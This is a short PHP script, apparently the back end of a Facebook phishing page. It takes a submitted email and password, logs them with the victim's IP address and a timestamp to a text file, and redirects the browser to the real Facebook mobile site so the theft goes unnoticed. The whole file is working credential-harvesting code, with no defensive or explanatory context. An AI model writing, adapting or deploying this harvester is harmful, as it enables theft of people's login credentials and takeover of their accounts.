<?php
  $correo = $_POST['correo'];
  $password = $_POST['password'];
  $ip = $_SERVER['REMOTE_ADDR'];
  
  $_SESSION['_IP_'] = $_SERVER["REMOTE_ADDR"];
  
  $fecha = date("d/m/y g:i:s");
  $file = fopen('result.txt', 'at');
  fwrite($file, "correo: $correo \n password: $password \n ip: $ip \n  fecha: $fecha \n");
  fclose($file);
  
  echo "<script>location.href='https://m.facebook.com'</script>";

?>